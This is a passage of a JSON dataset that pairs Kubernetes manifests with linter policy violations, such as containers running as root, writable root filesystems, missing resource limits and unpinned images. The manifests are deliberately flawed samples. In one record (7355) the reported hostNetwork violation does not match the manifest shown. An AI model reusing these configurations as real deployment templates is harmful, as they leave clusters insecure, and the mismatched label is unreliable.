    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: customerorderservicesapp-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: customerorderservicesapp-operator\n  template:\n    metadata:\n      labels:\n        name: customerorderservicesapp-operator\n    spec:\n      serviceAccountName: customerorderservicesapp-operator\n      containers:\n      - name: customerorderservicesapp-operator\n        image: openliberty/operator:0.7.0\n        command:\n        - open-liberty-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: customerorderservicesapp-operator\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 3\n            preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"customerorderservicesapp-operator\" does not have a read-only root file system"
  },
  {
    "id": "7351",
    "manifest_path": "data/manifests/the_stack_sample/sample_2685.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: customerorderservicesapp-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: customerorderservicesapp-operator\n  template:\n    metadata:\n      labels:\n        name: customerorderservicesapp-operator\n    spec:\n      serviceAccountName: customerorderservicesapp-operator\n      containers:\n      - name: customerorderservicesapp-operator\n        image: openliberty/operator:0.7.0\n        command:\n        - open-liberty-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: customerorderservicesapp-operator\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 3\n            preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"customerorderservicesapp-operator\" not found"
  },
  {
    "id": "7352",
    "manifest_path": "data/manifests/the_stack_sample/sample_2685.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: customerorderservicesapp-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: customerorderservicesapp-operator\n  template:\n    metadata:\n      labels:\n        name: customerorderservicesapp-operator\n    spec:\n      serviceAccountName: customerorderservicesapp-operator\n      containers:\n      - name: customerorderservicesapp-operator\n        image: openliberty/operator:0.7.0\n        command:\n        - open-liberty-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: customerorderservicesapp-operator\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 3\n            preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"customerorderservicesapp-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "7353",
    "manifest_path": "data/manifests/the_stack_sample/sample_2685.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: customerorderservicesapp-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: customerorderservicesapp-operator\n  template:\n    metadata:\n      labels:\n        name: customerorderservicesapp-operator\n    spec:\n      serviceAccountName: customerorderservicesapp-operator\n      containers:\n      - name: customerorderservicesapp-operator\n        image: openliberty/operator:0.7.0\n        command:\n        - open-liberty-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: customerorderservicesapp-operator\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 3\n            preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"customerorderservicesapp-operator\" has cpu request 0"
  },
  {
    "id": "7354",
    "manifest_path": "data/manifests/the_stack_sample/sample_2685.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: customerorderservicesapp-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: customerorderservicesapp-operator\n  template:\n    metadata:\n      labels:\n        name: customerorderservicesapp-operator\n    spec:\n      serviceAccountName: customerorderservicesapp-operator\n      containers:\n      - name: customerorderservicesapp-operator\n        image: openliberty/operator:0.7.0\n        command:\n        - open-liberty-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: customerorderservicesapp-operator\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 3\n            preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"customerorderservicesapp-operator\" has memory limit 0"
  },
  {
    "id": "7355",
    "manifest_path": "data/manifests/the_stack_sample/sample_2689.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: vsphere-cloud-controller-manager\n  name: vsphere-cloud-controller-manager\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: vsphere-cloud-controller-manager\n  template:\n    metadata:\n      labels:\n        k8s-app: vsphere-cloud-controller-manager\n    spec:\n      containers:\n      - args:\n        - --v=2\n        - --cloud-provider=vsphere\n        - --cloud-config=/etc/cloud/vsphere.conf\n        image: gcr.io/cloud-provider-vsphere/cpi/release/manager:v1.21.0\n        imagePullPolicy: IfNotPresent\n        name: vsphere-cloud-controller-manager\n        resources:\n          requests:\n            cpu: 200m\n        volumeMounts:\n        - mountPath: /etc/cloud\n          name: vsphere-config-volume\n          readOnly: true\n      serviceAccountName: cloud-controller-manager\n      volumes:\n      - configMap:\n          name: vsphere-cloud-config\n        name: vsphere-config-volume\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "7356",
    "manifest_path": "data/manifests/the_stack_sample/sample_2689.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: vsphere-cloud-controller-manager\n  name: vsphere-cloud-controller-manager\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: vsphere-cloud-controller-manager\n  template:\n    metadata:\n      labels:\n        k8s-app: vsphere-cloud-controller-manager\n    spec:\n      containers:\n      - args:\n        - --v=2\n        - --cloud-provider=vsphere\n        - --cloud-config=/etc/cloud/vsphere.conf\n        image: gcr.io/cloud-provider-vsphere/cpi/release/manager:v1.21.0\n        imagePullPolicy: IfNotPresent\n        name: vsphere-cloud-controller-manager\n        resources:\n          requests:\n            cpu: 200m\n        volumeMounts:\n        - mountPath: /etc/cloud\n          name: vsphere-config-volume\n          readOnly: true\n      serviceAccountName: cloud-controller-manager\n      volumes:\n      - configMap:\n          name: vsphere-cloud-config\n        name: vsphere-config-volume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"vsphere-cloud-controller-manager\" does not have a read-only root file system"
  },
  {
    "id": "7357",
    "manifest_path": "data/manifests/the_stack_sample/sample_2689.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: vsphere-cloud-controller-manager\n  name: vsphere-cloud-controller-manager\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: vsphere-cloud-controller-manager\n  template:\n    metadata:\n      labels:\n        k8s-app: vsphere-cloud-controller-manager\n    spec:\n      containers:\n      - args:\n        - --v=2\n        - --cloud-provider=vsphere\n        - --cloud-config=/etc/cloud/vsphere.conf\n        image: gcr.io/cloud-provider-vsphere/cpi/release/manager:v1.21.0\n        imagePullPolicy: IfNotPresent\n        name: vsphere-cloud-controller-manager\n        resources:\n          requests:\n            cpu: 200m\n        volumeMounts:\n        - mountPath: /etc/cloud\n          name: vsphere-config-volume\n          readOnly: true\n      serviceAccountName: cloud-controller-manager\n      volumes:\n      - configMap:\n          name: vsphere-cloud-config\n        name: vsphere-config-volume\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"cloud-controller-manager\" not found"
  },
  {
    "id": "7358",
    "manifest_path": "data/manifests/the_stack_sample/sample_2689.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: vsphere-cloud-controller-manager\n  name: vsphere-cloud-controller-manager\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: vsphere-cloud-controller-manager\n  template:\n    metadata:\n      labels:\n        k8s-app: vsphere-cloud-controller-manager\n    spec:\n      containers:\n      - args:\n        - --v=2\n        - --cloud-provider=vsphere\n        - --cloud-config=/etc/cloud/vsphere.conf\n        image: gcr.io/cloud-provider-vsphere/cpi/release/manager:v1.21.0\n        imagePullPolicy: IfNotPresent\n        name: vsphere-cloud-controller-manager\n        resources:\n          requests:\n            cpu: 200m\n        volumeMounts:\n        - mountPath: /etc/cloud\n          name: vsphere-config-volume\n          readOnly: true\n      serviceAccountName: cloud-controller-manager\n      volumes:\n      - configMap:\n          name: vsphere-cloud-config\n        name: vsphere-config-volume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"vsphere-cloud-controller-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "7359",
    "manifest_path": "data/manifests/the_stack_sample/sample_2689.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: vsphere-cloud-controller-manager\n  name: vsphere-cloud-controller-manager\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: vsphere-cloud-controller-manager\n  template:\n    metadata:\n      labels:\n        k8s-app: vsphere-cloud-controller-manager\n    spec:\n      containers:\n      - args:\n        - --v=2\n        - --cloud-provider=vsphere\n        - --cloud-config=/etc/cloud/vsphere.conf\n        image: gcr.io/cloud-provider-vsphere/cpi/release/manager:v1.21.0\n        imagePullPolicy: IfNotPresent\n        name: vsphere-cloud-controller-manager\n        resources:\n          requests:\n            cpu: 200m\n        volumeMounts:\n        - mountPath: /etc/cloud\n          name: vsphere-config-volume\n          readOnly: true\n      serviceAccountName: cloud-controller-manager\n      volumes:\n      - configMap:\n          name: vsphere-cloud-config\n        name: vsphere-config-volume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"vsphere-cloud-controller-manager\" has memory limit 0"
  },
  {
    "id": "7360",
    "manifest_path": "data/manifests/the_stack_sample/sample_2692.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: baldur-tensplit\nspec:\n  containers:\n  - name: baldur-cname\n    image: 952478859445.dkr.ecr.us-east-1.amazonaws.com/mkt-devops/mkt-tenant-splitter:baldur\n    resources:\n      requests:\n        cpu: 500m\n        memory: 256Mi\n      limits:\n        cpu: 1000m\n        memory: 1024Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"baldur-cname\" does not have a read-only root file system"
  },
  {
    "id": "7361",
    "manifest_path": "data/manifests/the_stack_sample/sample_2692.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: baldur-tensplit\nspec:\n  containers:\n  - name: baldur-cname\n    image: 952478859445.dkr.ecr.us-east-1.amazonaws.com/mkt-devops/mkt-tenant-splitter:baldur\n    resources:\n      requests:\n        cpu: 500m\n        memory: 256Mi\n      limits:\n        cpu: 1000m\n        memory: 1024Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"baldur-cname\" is not set to runAsNonRoot"
  },
  {
    "id": "7362",
    "manifest_path": "data/manifests/the_stack_sample/sample_2694.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    noobaa.knative.dev/release: devel\n    control-plane: noobaa-source-controller-manager\n  name: noobaa-source-controller-manager\n  namespace: knative-noobaa\nspec:\n  selector:\n    control-plane: noobaa-source-controller-manager\n  ports:\n  - port: 443\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[control-plane:noobaa-source-controller-manager])"
  },
  {
    "id": "7363",
    "manifest_path": "data/manifests/the_stack_sample/sample_2695.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: message-publisher\n  labels:\n    app: message-publisher\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: message-publisher\n  template:\n    metadata:\n      labels:\n        app: message-publisher\n    spec:\n      containers:\n      - image: gjtempleton/pika:0.2.1\n        name: message-publisher\n        command:\n        - python\n        - -u\n        - /pika-producer.py\n        env:\n        - name: RABBIT_CONNECTION\n          value: rabbitmq.default.svc.cluster.local\n        - name: RABBIT_USERNAME\n          value: user\n        - name: RABBIT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: rabbitmq-password\n              name: rabbitmq\n        - name: MESSAGES_PER_SECOND\n          value: '1'\n        resources:\n          requests:\n            cpu: 200m\n            memory: 64Mi\n          limits:\n            cpu: 200m\n            memory: 64Mi\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7364",
    "manifest_path": "data/manifests/the_stack_sample/sample_2695.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: message-publisher\n  labels:\n    app: message-publisher\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: message-publisher\n  template:\n    metadata:\n      labels:\n        app: message-publisher\n    spec:\n      containers:\n      - image: gjtempleton/pika:0.2.1\n        name: message-publisher\n        command:\n        - python\n        - -u\n        - /pika-producer.py\n        env:\n        - name: RABBIT_CONNECTION\n          value: rabbitmq.default.svc.cluster.local\n        - name: RABBIT_USERNAME\n          value: user\n        - name: RABBIT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: rabbitmq-password\n              name: rabbitmq\n        - name: MESSAGES_PER_SECOND\n          value: '1'\n        resources:\n          requests:\n            cpu: 200m\n            memory: 64Mi\n          limits:\n            cpu: 200m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"message-publisher\" does not have a read-only root file system"
  },
  {
    "id": "7365",
    "manifest_path": "data/manifests/the_stack_sample/sample_2695.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: message-publisher\n  labels:\n    app: message-publisher\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: message-publisher\n  template:\n    metadata:\n      labels:\n        app: message-publisher\n    spec:\n      containers:\n      - image: gjtempleton/pika:0.2.1\n        name: message-publisher\n        command:\n        - python\n        - -u\n        - /pika-producer.py\n        env:\n        - name: RABBIT_CONNECTION\n          value: rabbitmq.default.svc.cluster.local\n        - name: RABBIT_USERNAME\n          value: user\n        - name: RABBIT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: rabbitmq-password\n              name: rabbitmq\n        - name: MESSAGES_PER_SECOND\n          value: '1'\n        resources:\n          requests:\n            cpu: 200m\n            memory: 64Mi\n          limits:\n            cpu: 200m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"message-publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "7366",
    "manifest_path": "data/manifests/the_stack_sample/sample_2696.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: filterevents\nspec:\n  containers:\n  - name: filterevents\n    image: knative.dev/eventing/test/test_images/filterevents\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"filterevents\" is using an invalid container image, \"knative.dev/eventing/test/test_images/filterevents\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7367",
    "manifest_path": "data/manifests/the_stack_sample/sample_2696.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: filterevents\nspec:\n  containers:\n  - name: filterevents\n    image: knative.dev/eventing/test/test_images/filterevents\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"filterevents\" does not have a read-only root file system"
  },
  {
    "id": "7368",
    "manifest_path": "data/manifests/the_stack_sample/sample_2696.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: filterevents\nspec:\n  containers:\n  - name: filterevents\n    image: knative.dev/eventing/test/test_images/filterevents\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"filterevents\" is not set to runAsNonRoot"
  },
  {
    "id": "7369",
    "manifest_path": "data/manifests/the_stack_sample/sample_2696.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: filterevents\nspec:\n  containers:\n  - name: filterevents\n    image: knative.dev/eventing/test/test_images/filterevents\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"filterevents\" has cpu request 0"
  },
  {
    "id": "7370",
    "manifest_path": "data/manifests/the_stack_sample/sample_2696.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: filterevents\nspec:\n  containers:\n  - name: filterevents\n    image: knative.dev/eventing/test/test_images/filterevents\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"filterevents\" has memory limit 0"
  },
  {
    "id": "7371",
    "manifest_path": "data/manifests/the_stack_sample/sample_2697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: premerge-debian\n  namespace: buildkite\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: agent-premerge-debian\n  template:\n    metadata:\n      labels:\n        app: agent-premerge-debian\n    spec:\n      containers:\n      - name: buildkite-premerge-debian\n        image: gcr.io/llvm-premerge-checks/buildkite-premerge-debian\n        resources:\n          limits:\n            cpu: 30\n            memory: 80Gi\n          requests:\n            cpu: 30\n            memory: 80Gi\n        volumeMounts:\n        - name: ssd\n          mountPath: /mnt/disks/ssd0\n        - name: github-ssh\n          mountPath: /mnt/ssh\n        env:\n        - name: BUILDKITE_AGENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: buildkite-agent-token\n              key: token\n        - name: BUILDKITE_AGENT_TAGS\n          value: queue=linux\n        - name: BUILDKITE_BUILD_PATH\n          value: /mnt/disks/ssd0/agent\n        - name: CONDUIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: conduit-api-token\n              key: token\n      volumes:\n      - name: ssd\n        hostPath:\n          path: /mnt/disks/ssd0\n          type: Directory\n      - name: github-ssh\n        secret:\n          secretName: github-ssh\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"buildkite-premerge-debian\" is using an invalid container image, \"gcr.io/llvm-premerge-checks/buildkite-premerge-debian\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7372",
    "manifest_path": "data/manifests/the_stack_sample/sample_2697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: premerge-debian\n  namespace: buildkite\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: agent-premerge-debian\n  template:\n    metadata:\n      labels:\n        app: agent-premerge-debian\n    spec:\n      containers:\n      - name: buildkite-premerge-debian\n        image: gcr.io/llvm-premerge-checks/buildkite-premerge-debian\n        resources:\n          limits:\n            cpu: 30\n            memory: 80Gi\n          requests:\n            cpu: 30\n            memory: 80Gi\n        volumeMounts:\n        - name: ssd\n          mountPath: /mnt/disks/ssd0\n        - name: github-ssh\n          mountPath: /mnt/ssh\n        env:\n        - name: BUILDKITE_AGENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: buildkite-agent-token\n              key: token\n        - name: BUILDKITE_AGENT_TAGS\n          value: queue=linux\n        - name: BUILDKITE_BUILD_PATH\n          value: /mnt/disks/ssd0/agent\n        - name: CONDUIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: conduit-api-token\n              key: token\n      volumes:\n      - name: ssd\n        hostPath:\n          path: /mnt/disks/ssd0\n          type: Directory\n      - name: github-ssh\n        secret:\n          secretName: github-ssh\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7373",
    "manifest_path": "data/manifests/the_stack_sample/sample_2697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: premerge-debian\n  namespace: buildkite\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: agent-premerge-debian\n  template:\n    metadata:\n      labels:\n        app: agent-premerge-debian\n    spec:\n      containers:\n      - name: buildkite-premerge-debian\n        image: gcr.io/llvm-premerge-checks/buildkite-premerge-debian\n        resources:\n          limits:\n            cpu: 30\n            memory: 80Gi\n          requests:\n            cpu: 30\n            memory: 80Gi\n        volumeMounts:\n        - name: ssd\n          mountPath: /mnt/disks/ssd0\n        - name: github-ssh\n          mountPath: /mnt/ssh\n        env:\n        - name: BUILDKITE_AGENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: buildkite-agent-token\n              key: token\n        - name: BUILDKITE_AGENT_TAGS\n          value: queue=linux\n        - name: BUILDKITE_BUILD_PATH\n          value: /mnt/disks/ssd0/agent\n        - name: CONDUIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: conduit-api-token\n              key: token\n      volumes:\n      - name: ssd\n        hostPath:\n          path: /mnt/disks/ssd0\n          type: Directory\n      - name: github-ssh\n        secret:\n          secretName: github-ssh\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"buildkite-premerge-debian\" does not have a read-only root file system"
  },
  {
    "id": "7374",
    "manifest_path": "data/manifests/the_stack_sample/sample_2697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: premerge-debian\n  namespace: buildkite\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: agent-premerge-debian\n  template:\n    metadata:\n      labels:\n        app: agent-premerge-debian\n    spec:\n      containers:\n      - name: buildkite-premerge-debian\n        image: gcr.io/llvm-premerge-checks/buildkite-premerge-debian\n        resources:\n          limits:\n            cpu: 30\n            memory: 80Gi\n          requests:\n            cpu: 30\n            memory: 80Gi\n        volumeMounts:\n        - name: ssd\n          mountPath: /mnt/disks/ssd0\n        - name: github-ssh\n          mountPath: /mnt/ssh\n        env:\n        - name: BUILDKITE_AGENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: buildkite-agent-token\n              key: token\n        - name: BUILDKITE_AGENT_TAGS\n          value: queue=linux\n        - name: BUILDKITE_BUILD_PATH\n          value: /mnt/disks/ssd0/agent\n        - name: CONDUIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: conduit-api-token\n              key: token\n      volumes:\n      - name: ssd\n        hostPath:\n          path: /mnt/disks/ssd0\n          type: Directory\n      - name: github-ssh\n        secret:\n          secretName: github-ssh\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"buildkite-premerge-debian\" is not set to runAsNonRoot"
  },
  {
    "id": "7375",
    "manifest_path": "data/manifests/the_stack_sample/sample_2699.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20220519-c750e0df24\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tide\" does not have a read-only root file system"
  },
  {
    "id": "7376",
    "manifest_path": "data/manifests/the_stack_sample/sample_2699.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20220519-c750e0df24\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"tide\" not found"
  },
  {
    "id": "7377",
    "manifest_path": "data/manifests/the_stack_sample/sample_2699.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20220519-c750e0df24\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tide\" is not set to runAsNonRoot"
  },
  {
    "id": "7378",
    "manifest_path": "data/manifests/the_stack_sample/sample_2699.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20220519-c750e0df24\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tide\" has cpu request 0"
  },
  {
    "id": "7379",
    "manifest_path": "data/manifests/the_stack_sample/sample_2699.yaml",
